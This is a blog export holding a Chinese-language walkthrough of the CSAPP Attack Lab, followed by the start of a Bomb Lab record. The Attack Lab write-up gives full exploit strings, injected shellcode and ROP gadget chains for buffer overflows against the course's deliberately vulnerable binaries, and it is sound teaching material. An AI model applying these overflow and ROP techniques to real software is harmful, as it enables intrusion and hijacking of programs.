{"categories":[{"title":"CSAPP","uri":"https://www.stana.top/categories/csapp/"},{"title":"Tool","uri":"https://www.stana.top/categories/tool/"}],"posts":[{"content":"CSAPP\u0026ndash;Attack Lab实验记录 [toc]\n前言 这个实验是csapp lab系列的第三个实验，实验内容主要是通过一些“攻击”手段，让我们了解缓冲区溢出隐患以及如何利用缓冲区溢出对现有的程序进行控制流劫持、执行非法程序\u0026hellip;\u0026hellip;\n实验准备 实验资料  《深入理解计算机系统》3.10.2~3.10.5 实验指导书\u0026ndash;writeup GDB的使用  相关知识 c语言对数组的引用不进行任何边界检查，而局部变量和状态信息（如保存寄存器的值和返回地址）都放到了栈中。多数组进行写操作越界的时候，会破环存储在栈中的状态信息。当程序使用这个被破环的状态，试图重新加载寄存器或执行ret指令时，就会出现很严重的错误。例如，缓冲区溢出。\n下面通过书上的例子，说明问题：\n/** echo.c 参照书籍中的代码*/ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void explosion(){ printf(\u0026quot;!!!You touch the explosion\u0026quot;); exit(0); } /* Implementation of library function gets() */ char *custom_gets(char *s){ int c; char *dest = s; while((c = getchar()) != '\\n' \u0026amp;\u0026amp; c != EOF) *dest++ = c; if(c == EOF \u0026amp;\u0026amp; dest == s) /* No characters read */ return NULL; *dest++ = '\\0'; /* Terminate string */ return s; } /** Read input line and write it back */ void echo(){ char buf[8]; custom_gets(buf); puts(buf); } int main(int argc, char* argv[]){ echo(); return 0; }  检查GCC 为 echo产生的汇编代码，看看栈是如何组织的：\necho: subq $24, %rsp movq %rsp, %rdi call custom_gets movq %rsp, %rdi call puts addq $24, %rsp ret  从汇编代码中可以看出，该程序在栈上为字符数组分配了24个字节。所以用户定义的字符数组为8个字节，意味着即使用户输入超过8个字节也不一定会对栈的状态信息造成破坏。但是如果用户输入超过23个字节，则会将echo的返回地址给破坏，这就是缓冲区溢出漏洞。\n实验目录 首先下载实验文件，然后解压，可以看到lab的目录如下：\n  cookie.txt 一个8为16进行数，作为攻击的特殊标志符\n  farm.c 在ROP攻击中作为gadgets的产生源\n  ctarget 代码注入攻击的目标文件\n  rtarget ROP攻击的目标文件\n  hex2row 将16进制数转化为攻击字符，因为有些字符在屏幕上面无法输入，所以输入该字符的16进制数，自动转化为该字符\n  实验内容 Part I: Code Injection Attacks level 1 For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute an existing procedure.\nFunction getbuf is called within CTARGET by a function test having the following C code:\nvoid test() { int val; val = getbuf(); printf(\u0026quot;No exploit. Getbuf returned 0x%x\\n\u0026quot;, val); }  When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget, there is code for a function touch1 having the following C representation:\nvoid touch1() { vlevel = 1; /* Part of validation protocol */ printf(\u0026quot;Touch1!: You called touch1()\\n\u0026quot;); validate(1); exit(0); }  Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.\nSome Advice:\n All the information you need to devise your exploit string for this level can be determined by examining a disassembled version of CTARGET. Use objdump -d to get this dissembled version. The idea is to position a byte representation of the starting address for touch1 so that the ret instruction at the end of the code for getbuf will transfer control to touch1. Be careful about byte ordering. • You might want to use GDB to step the program through the last few instructions of getbuf to make sure it is doing the right thing. The placement of buf within the stack frame for getbuf depends on the value of compile-time constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the disassembled code to determine its position.  上面是level 的实验任务介绍，大体意思就是让我们对 ctarget这个程序的test函数中调用的getbuf函数进行输入内容，利用溢出，调用touch1函数。\n首先我们可以反编译整个ctarget输出内容daoctarget.asm文件中（推荐）\n$ objdump -d ctarget \u0026gt; ctarget.asm  这样就可以得到整个程序的汇编内容。或者也可以利用gdb disas命令查看想要查看的函数的汇编代码：\n(gdb) disas touch1 Dump of assembler code for function touch1: 0x00000000004017c0 \u0026lt;+0\u0026gt;: sub $0x8,%rsp 0x00000000004017c4 \u0026lt;+4\u0026gt;: movl $0x1,0x202d0e(%rip) # 0x6044dc \u0026lt;vlevel\u0026gt; 0x00000000004017ce \u0026lt;+14\u0026gt;: mov $0x4030c5,%edi 0x00000000004017d3 \u0026lt;+19\u0026gt;: callq 0x400cc0 \u0026lt;puts@plt\u0026gt; 0x00000000004017d8 \u0026lt;+24\u0026gt;: mov $0x1,%edi 0x00000000004017dd \u0026lt;+29\u0026gt;: callq 0x401c8d \u0026lt;validate\u0026gt; 0x00000000004017e2 \u0026lt;+34\u0026gt;: mov $0x0,%edi 0x00000000004017e7 \u0026lt;+39\u0026gt;: callq 0x400e40 \u0026lt;exit@plt\u0026gt;  而我们现在主要需要关注的是test跟getbuf函数，因为要观察它们的缓冲区大小，才能直到溢出的临界值是多少，在ctarget.asm 文件中查找这两个函数名，得到它们的汇编代码：\n00000000004017a8 \u0026lt;getbuf\u0026gt;: 4017a8:\t48 83 ec 28 sub $0x28,%rsp 4017ac:\t48 89 e7 mov %rsp,%rdi 4017af:\te8 8c 02 00 00 callq 401a40 \u0026lt;Gets\u0026gt; 4017b4:\tb8 01 00 00 00 mov $0x1,%eax 4017b9:\t48 83 c4 28 add $0x28,%rsp 4017bd:\tc3 retq 4017be:\t90 nop 4017bf:\t90 nop ...... 0000000000401968 \u0026lt;test\u0026gt;: 401968:\t48 83 ec 08 sub $0x8,%rsp 40196c:\tb8 00 00 00 00 mov $0x0,%eax 401971:\te8 32 fe ff ff callq 4017a8 \u0026lt;getbuf\u0026gt; 401976:\t89 c2 mov %eax,%edx 401978:\tbe 88 31 40 00 mov $0x403188,%esi 40197d:\tbf 01 00 00 00 mov $0x1,%edi 401982:\tb8 00 00 00 00 mov $0x0,%eax 401987:\te8 64 f4 ff ff callq 400df0 \u0026lt;__printf_chk@plt\u0026gt; 40198c:\t48 83 c4 08 add $0x8,%rsp 401990:\tc3 retq 401991:\t90 nop 401992:\t90 nop 401993:\t90 nop 401994:\t90 nop 401995:\t90 nop 401996:\t90 nop 401997:\t90 nop 401998:\t90 nop 401999:\t90 nop 40199a:\t90 nop 40199b:\t90 nop 40199c:\t90 nop 40199d:\t90 nop 40199e:\t90 nop 40199f:\t90 nop  可以看到sub $0x28,%rsp这里就是在栈上分配给缓冲区的大小空间：0x28 = 40字节。所以只需要在输入40字节内容 后面再加上 touch1的地址的话，就能将原来test函数的地址覆盖，retq指令将跳转到touch1。我们试验一下：\n首先，查看一下touch1的地址\n0x00000000004017c0  然后新建一个文件ctarget.l1.txt用来存储我们输入的内容，这里前40个字节 都用 00 来填充，最后输入touch1的地址，注意，这里的地址是反过来写，因为机器存的是小端序，低位字节存在低位地址:\n$ vim ctarget.l1.txt 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40  然后运行看看结果：\n$ ./hex2raw -i ctarget.l1.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40  顺利完成！\nlevel 2 Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function touch2 having the following C representation:\nvoid touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(\u0026quot;Touch2!: You called touch2(0x%.8x)\\n\u0026quot;, val); validate(2); } else { printf(\u0026quot;Misfire: You called touch2(0x%.8x)\\n\u0026quot;, val); fail(2); } exit(0); }  Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.\nSome Advice:\n You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it. Recall that the first argument to a function is passed in register %rdi. Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2. Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call. See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequences.  从上文可以看到，这个任务主要是让我们注入一段代码，执行touch2函数，然后比较传入的val是否与cookie值相等，相等则成功。实验要求我们不能通过jmp或者call指令来跳转，只能通过ret。\nret是从栈上弹出返回地址，所以要想跳转至touch2，那么我们就需要在栈顶弹入touch2的地址。\n所以我们可以先整理一下思路：\n 在ctarget.asm文件中查看touch2函数的地址 编写插入的汇编代码，然后编译得到指令 将指令插入到我们需要输入的字符串开头 在末尾插入跳转的地址（%rsp）  首先，查看touch2函数的地址\n0x4017ec  接着，获取%rsp 的值0x5561dc78\n$ gdb ctarget (gdb) break getbuf Breakpoint 1 at 0x4017a8: file buf.c, line 12. (gdb) run -q Starting program: /home/lincx/c++/CSAPP-Labs-master/labs/source/labfile/target1/ctarget -q Cookie: 0x59b997fa Breakpoint 1, getbuf () at buf.c:12 12 buf.c: No such file or directory. (gdb) stepi 14 in buf.c (gdb) p /x %rsp A syntax error in expression, near `%rsp'. (gdb) p /x $rsp $1 = 0x5561dc78  然后，新建ctarget.s文件编写插入的汇编代码：\nmov $0x59b997fa,%rdi pushq $0x4017ec ret  编译，得到汇编指令48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3：\n$ objdump -d ctarget2.o \u0026gt; ctarget2insert.asm $ vim ctarget2insert.asm ctarget2.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 pushq 0x4017ec e: c3 retq  构造输入字符，新建ctarget.l2.txt：\n$ vim ctarget.l2.txt 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00  执行命令，查看结果：\n$ ./hex2raw -i ctarget.l2.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00  level 3 Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval){ char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \u0026quot;%.8x\u0026quot;, val); return strncmp(sval, s, 9) == 0; } void touch3(char *sval){ vlevel = 3; if (hexmatch(cookie, sval)){ printf(\u0026quot;Touch3!: You called touch3(\\\u0026quot;%s\\\u0026quot;)\\n\u0026quot;, sval); validate(3); } else { printf(\u0026quot;Misfire: You called touch3(\\\u0026quot;%s\\\u0026quot;)\\n\u0026quot;, sval); fail(3); } exit(0); }  Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.\nSome Advice:\n You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.” Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need. Your injected code should set register %rdi to the address of this string. When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.  与前面不同的是，这次传进的参数是一个字符串，同时函数内部用了另外一个函数来比较。本次要 比较的是\u0026quot;59b997fa\u0026quot;这个字符串。\n上面提示的第四点，当调用hexmatch和strncmp时，他们会把数据压入到栈中，有可能会覆盖getbuf栈帧的数据，所以传进去字符串的位置必须小心谨慎。\nchar *s = cbuf + random() % 100;  这一行，s的位置是随机的，可能覆盖掉之前getbuf的内容。所以不能将字符串保存在getbuf中，我们可以将字符串保存到父栈帧test中。\n(gdb) disas test Dump of assembler code for function test: 0x0000000000401968 \u0026lt;+0\u0026gt;: sub $0x8,%rsp 0x000000000040196c \u0026lt;+4\u0026gt;: mov $0x0,%eax 0x0000000000401971 \u0026lt;+9\u0026gt;: callq 0x4017a8 \u0026lt;getbuf\u0026gt; 0x0000000000401976 \u0026lt;+14\u0026gt;: mov %eax,%edx 0x0000000000401978 \u0026lt;+16\u0026gt;: mov $0x403188,%esi 0x000000000040197d \u0026lt;+21\u0026gt;: mov $0x1,%edi 0x0000000000401982 \u0026lt;+26\u0026gt;: mov $0x0,%eax 0x0000000000401987 \u0026lt;+31\u0026gt;: callq 0x400df0 \u0026lt;__printf_chk@plt\u0026gt; 0x000000000040198c \u0026lt;+36\u0026gt;: add $0x8,%rsp 0x0000000000401990 \u0026lt;+40\u0026gt;: retq (gdb) break *0x40196c Breakpoint 1 at 0x40196c: file visible.c, line 92. (gdb) run -q Starting program: /home/lincx/c++/CSAPP-Labs-master/labs/source/labfile/target1/ctarget -q Cookie: 0x59b997fa Breakpoint 1, test () at visible.c:92 92 visible.c: No such file or directory. (gdb) print /x $rsp $1 = 0x5561dca8  所以我们可以：\n 将cookie的值转为16进制 然后写到test栈帧中，再将地址传到%rdi 将touch3地址压栈，同level 2  首先，编写汇编代码：\nmov $0x5561dca8,%rdi pushq $0x4018fa ret  编译，查看指令：\n$ gcc -c ctarget3.s $ objdump -d ctarget3.o \u0026gt; ctarget3insert.asm $ cat ctarget3insert.asm ctarget3.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq  查看man ascii将cookie 59b997fa 转换为16进制：35 39 62 39 39 37 66 61\n输入文件：\n48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61  执行命令，查看结果\n$ ./hex2raw -i ctarget.l3.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch3!: You called touch3(\u0026quot;59b997fa\u0026quot;) Valid solution for level 3 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61  Part II: Return-Oriented Programming 在ROP攻击中设置了栈随机化，所以我们不能像前面三个一样定位到精确地址插入代码。为了实现攻击，我们要在已经给定的代码中找到特定的指令序列，这些序列以ret结尾，我们把这些命令叫做gadget.\nlevel 2 For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).\nSome Advice:\n All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm. You can do this attack with just two gadgets. When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.  这个跟上面的ctargetlevel 2要求差不多，都是调用touch2，只不过这里要求在rtarget。根据第一点提示，所有用到的 gadgets在start_farm与mid_farm之间找。所以先将farm.c转换成指令\n$ gcc -c -Og farm.c #这里 不加-Og 会采用 stack frame pointer，而rtarget没有用该指针 $ objdump -d farm.o \u0026gt; farm.asm $ cat farm.asm 0000000000000000 \u0026lt;start_farm\u0026gt;: 0: f3 0f 1e fa endbr64 4: b8 01 00 00 00 mov $0x1,%eax 9: c3 retq 000000000000000a \u0026lt;getval_142\u0026gt;: a: f3 0f 1e fa endbr64 e: b8 fb 78 90 90 mov $0x909078fb,%eax 13: c3 retq 0000000000000014 \u0026lt;addval_273\u0026gt;: 14: f3 0f 1e fa endbr64 18: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 1e: c3 retq 000000000000001f \u0026lt;addval_219\u0026gt;: 1f: f3 0f 1e fa endbr64 23: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 29: c3 retq 000000000000002a \u0026lt;setval_237\u0026gt;: 2a: f3 0f 1e fa endbr64 2e: c7 07 48 89 c7 c7 movl $0xc7c78948,(%rdi) 34: c3 retq 0000000000000035 \u0026lt;setval_424\u0026gt;: 35: f3 0f 1e fa endbr64 39: c7 07 54 c2 58 92 movl $0x9258c254,(%rdi) 3f: c3 retq 0000000000000040 \u0026lt;setval_470\u0026gt;: 40: f3 0f 1e fa endbr64 44: c7 07 63 48 8d c7 movl $0xc78d4863,(%rdi) 4a: c3 retq 000000000000004b \u0026lt;setval_426\u0026gt;: 4b: f3 0f 1e fa endbr64 4f: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 55: c3 retq 0000000000000056 \u0026lt;getval_280\u0026gt;: 56: f3 0f 1e fa endbr64 5a: b8 29 58 90 c3 mov $0xc3905829,%eax 5f: c3 retq 0000000000000056 \u0026lt;getval_280\u0026gt;: 56: f3 0f 1e fa endbr64 5a: b8 29 58 90 c3 mov $0xc3905829,%eax 5f: c3 retq 0000000000000060 \u0026lt;mid_farm\u0026gt;: 60: f3 0f 1e fa endbr64 64: b8 01 00 00 00 mov $0x1,%eax 69: c3 retq  根据提示，只需要其中的两个，而我们大致的思路可以将cookie放到%rdi，把touch2的地址放到栈中，以ret执行。那么需要一个mov 跟 popq指令。\npop会把栈顶的cookie弹出到另外一个寄存器，再用mov命令写到%rdi里。\n下面是mov和pop的字节编码表：\n我们想要的代码：\npopq %rax #将栈顶8个字节内存储的值赋值给rax寄存器，并将栈顶指针向上移动八个字节 movq %rax,%rdi  在上表找 popq %rax对应的指令是 58，movq %rax,%rdi对应的指令是 48 89 c7。因为farm.c里边的函数已经整合进rtarget了，所以回到rtarget.asm中找，找到这两个：\n00000000004019a0 \u0026lt;addval_273\u0026gt;: 4019a0:\t8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6:\tc3 retq 00000000004019a7 \u0026lt;addval_219\u0026gt;: 4019a7:\t8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad:\tc3 retq  由上面的代码中可以看到，pop开始的地址为4019ab，mov开始的地址为4019a2\n查看touch2地址为\n0x4017ec  所以我们输入的内容到rtarget.l2.txt为:\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00  结果：\n$ ./hex2raw -i rtarget.l2.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00  level 3 Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.\nTo solve Phase 5, you can use gadgets in the region of the code in rtarget demarcated by functions start_farm and end_farm. In addition to the gadgets used in Phase 4, this expanded farm includes the encodings of different movl instructions, as shown in Figure 3C. The byte sequences in this part of the farm also contain 2-byte instructions that serve as functional nops, i.e., they do not change any register or memory values. These include instructions, shown in Figure 3D, such as andb %al,%al, that operate on the low-order bytes of some of the registers but do not change their values.\nSome Advice:\n You’ll want to review the effect a movl instruction has on the upper 4 bytes of a register, as is described on page 183 of the text. The official solution requires eight gadgets (not all of which are unique).  这里我们需要做的就是将字符串的起始地址，传送到 %rdi然后调用touch3函数。但是因为每次栈的位置都是随机的，无法直接用地址来找到字符串的位置，所以我们只能通过栈顶+偏移量来代替原来的方案。从farm中找不到add相关的指令，但是找到了lea (%rdi,%rsi,1),%rax代替 add\n具体操作：\n 将栈顶地址 %rsp 赋值给 %rdi 将偏移量bias 赋值给 %rsi 将栈顶+偏移量放到%rdi 调用touch3  这里的偏移量是，返回地址与字符串首地址之间有9条指令，每个指令8个byte，一共72字节，72=0x48。\n这里不能直接 mov %rax %rsi，因为farm中没有这条指令。\n分别找到这些指令的起始地址:\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 70 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00  输出到rtarget.l3.txt，执行查看结果\n$ ./hex2raw -i rtarget.l3.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch3!: You called touch3(\u0026quot;59b997fa\u0026quot;) Valid solution for level 3 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00  成功！\n总结 这次实验对gdb等工具的使用有了更进一步的了解，除此之外对，这种缓冲区溢出带来的漏洞认识更深了，最深刻的就是对栈上面的内容排布等很熟悉了。\n","id":0,"section":"posts","summary":"CSAPP\u0026ndash;Attack Lab实验记录 [toc] 前言 这个实验是csapp lab系列的第三个实验，实验内容主要是通过一些“攻击”手段，让我们了解缓冲区溢出隐患以及如何利用缓","tags":["csapp-lab","汇编"],"title":"CSAPP--Attack Lab实验记录","uri":"https://www.stana.top/2021/12/attack_lab/","year":"2021"},{"content":"CSAPP\u0026ndash;Bomb Lab实验记录 前言 本实验是《深入理解计算机系统》一书中的附带实验——二进制炸弹实验。二进制炸弹是一个作为目标代码文件提供给学生们的程序。运行时，它提示用户输入6个不同的字符串。如果其中的任何一个不正确，炸弹就会“爆炸”，打印出一条错误信息，并且在一个分级服务器上记录事件日志。学生们必须通过对程序反汇编和逆向工程来测定应该是哪6个串，从而解除他们各自炸弹的雷管。 该实验教会学生理解汇编语言，并且强制他们学习怎么使用调试器。\n一、实验准备 1.1 配置实验环境  linux 环境（ubuntu） gdb（调试程序使用）  1.2 实验必备知识  汇编语法 gdb基本指令使用  1.3 实验资源 实验官网 下载 Self-Study Handout\n或者\nGithub 这是其他人的，有自己的实验记录\n二、实验内容 1. phase_1 将bomb程序 反编译 得到汇编代码，放到bomb.ams文件中\n$ objdump -d bomb \u0026gt; bomb.asm  使用编辑器（vscode)打开bomb.ams文件,定位到 main函数在的地方，找到phase_1函数的地址 400ee0。这行前面的可以对着看 bomb.c文件对应的代码。\n0000000000400da0 \u0026lt;main\u0026gt;: 400da0:\t53 push %rbx 400da1:\t83 ff 01 cmp $0x1,%edi ...... \u0026lt;read_line\u0026gt; 400e37:\t48 89 c7 mov %rax,%rdi 400e3a:\te8 a1 00 00 00 callq 400ee0 \u0026lt;phase_1\u0026gt; 400e3f:\te8 80 07 00 00 callq 4015c4 ......  然后 搜索 400ee0的位置，得到 phase_1函数的汇编代码\n0000000000400ee0 \u0026lt;phase_1\u0026gt;: 400ee0:\t48 83 ec 08 sub $0x8,%rsp # 栈指针减去8（分配空间） 400ee4:\tbe 00 24 40 00 mov $0x402400,%esi # 将0x402400作为参数传入 400ee9:\te8 4a 04 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt; #调用该方法 400eee:\t85 c0 test %eax,%eax # 比较返回值 400ef0:\t74 05 je 400ef7 \u0026lt;phase_1+0x17\u0026gt; 400ef2:\te8 43 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; # 如果返回值不为0，爆炸 400ef7:\t48 83 c4 08 add $0x8,%rsp 400efb:\tc3 retq  其实从\u0026lt;strings_not_equal\u0026gt; 可以大致猜到这个函数是字符串比较的函数，为了验证猜想是否正确，我们继续跳到这个函数地址401338看看\n0000000000401338 \u0026lt;strings_not_equal\u0026gt;: 401338:\t41 54 push %r12 40133a:\t55 push %rbp 40133b:\t53 push %rbx 40133c:\t48 89 fb mov %rdi,%rbx 40133f:\t48 89 f5 mov %rsi,%rbp 401342:\te8 d4 ff ff ff callq 40131b \u0026lt;string_length\u0026gt; 401347:\t41 89 c4 mov %eax,%r12d 40134a:\t48 89 ef mov %rbp,%rdi 40134d:\te8 c9 ff ff ff callq 40131b \u0026lt;string_length\u0026gt; 401352:\tba 01 00 00 00 mov $0x1,%edx 401357:\t41 39 c4 cmp %eax,%r12d 40135a:\t75 3f jne 40139b \u0026lt;strings_not_equal+0x63\u0026gt; 40135c:\t0f b6 03 movzbl (%rbx),%eax 40135f:\t84 c0 test %al,%al 401361:\t74 25 je 401388 \u0026lt;strings_not_equal+0x50\u0026gt; 401363:\t3a 45 00 cmp 0x0(%rbp),%al 401366:\t74 0a je 401372 \u0026lt;strings_not_equal+0x3a\u0026gt; 401368:\teb 25 jmp 40138f \u0026lt;strings_not_equal+0x57\u0026gt; 40136a:\t3a 45 00 cmp 0x0(%rbp),%al 40136d:\t0f 1f 00 nopl (%rax) 401370:\t75 24 jne 401396 \u0026lt;strings_not_equal+0x5e\u0026gt; 401372:\t48 83 c3 01 add $0x1,%rbx 401376:\t48 83 c5 01 add $0x1,%rbp 40137a:\t0f b6 03 movzbl (%rbx),%eax 40137d:\t84 c0 test %al,%al 40137f:\t75 e9 jne 40136a \u0026lt;strings_not_equal+0x32\u0026gt; 401381:\tba 00 00 00 00 mov $0x0,%edx 401386:\teb 13 jmp 40139b \u0026lt;strings_not_equal+0x63\u0026gt; 401388:\tba 00 00 00 00 mov $0x0,%edx 40138d:\teb 0c jmp 40139b \u0026lt;strings_not_equal+0x63\u0026gt; 40138f:\tba 01 00 00 00 mov $0x1,%edx 401394:\teb 05 jmp 40139b \u0026lt;strings_not_equal+0x63\u0026gt; 401396:\tba 01 00 00 00 mov $0x1,%edx 40139b:\t89 d0 mov %edx,%eax 40139d:\t5b pop %rbx 40139e:\t5d pop %rbp 40139f:\t41 5c pop %r12 4013a1:\tc3 retq  可以看到，这个strings_not_equal函数接收两个参数，然后接下来就是比较这两个参数的长度是否相等，若相等则继续比较每个位置对应的字符是否相同，最后返回结果\n那现在phase_1函数的内容很明显了，就是比较我们输入的字符串与0x402400这个位置的字符串是否相等，不相等就会bomb\n接下来我们看看0x402400这个位置究竟存了什么内容。\n 首先gdb调试bomb程序 在这个phase_1函数设置断点 输出这个位置的内容  $ gdb bomb For help, type \u0026quot;help\u0026quot;. Type \u0026quot;apropos word\u0026quot; to search for commands related to \u0026quot;word\u0026quot;... Reading symbols from bomb... (gdb) b *0x400ee4 Breakpoint 1 at 0x400ee4 (gdb) run Starting program: /home/lincx/文档/CSAPP-Labs-master/labs/source/bomb/bomb Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! asd Breakpoint 1, 0x0000000000400ee4 in phase_1 () (gdb) x/s 0x402400 0x402400:\t\u0026quot;Border relations with Canada have never been better.\u0026quot; (gdb)  其中 b*0x400ee4表示设置断点，x/s 0x402400表示输出该位置的内容为字符串形式。 可以看到内容是 \u0026ldquo;Border relations with Canada have never been better.\u0026rdquo; 这也是我们需要找的答案了。\n2. phase_2 首先也是在bomb.asm文件中，定位到phase_2的位置，然后逐句分析\n0000000000400efc \u0026lt;phase_2\u0026gt;: 400efc:\t55 push %rbp #栈帧 400efd:\t53 push %rbx #栈帧 400efe:\t48 83 ec 28 sub $0x28,%rsp #栈指针减40 400f02:\t48 89 e6 mov %rsp,%rsi # 将栈指针作为第二个参数 400f05:\te8 52 05 00 00 callq 40145c \u0026lt;read_six_numbers\u0026gt; #调用函数 400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp) # 栈指针内存位置的内容与1比较 400f0e:\t74 20 je 400f30 \u0026lt;phase_2+0x34\u0026gt; # 相等跳到 400f30 400f10:\te8 25 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; # 不相等就会爆炸 400f15:\teb 19 jmp 400f30 \u0026lt;phase_2+0x34\u0026gt; # 跳到400f30 400f17:\t8b 43 fc mov -0x4(%rbx),%eax # 将 %rbx-0x4 内存位置的内容 赋值给%eax 400f1a:\t01 c0 add %eax,%eax # %eax = 